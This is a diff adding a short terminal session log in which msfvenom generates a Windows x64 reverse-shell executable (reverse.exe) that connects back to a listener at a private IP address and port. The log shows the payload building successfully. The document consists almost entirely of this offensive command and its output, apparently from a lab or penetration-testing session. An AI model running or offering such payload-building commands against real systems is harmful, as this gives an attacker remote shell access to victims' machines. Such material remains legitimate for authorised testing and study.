@@ -1,0 +1,9 @@
+Script started on 2025-07-20 13:23:19+03:00 [COMMAND="msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.0.81 LPORT=6047 -f exe -o reverse.exe" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="26"]
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: reverse.exe
+
+Script done on 2025-07-20 13:23:24+03:00 [COMMAND_EXIT_CODE="0"]
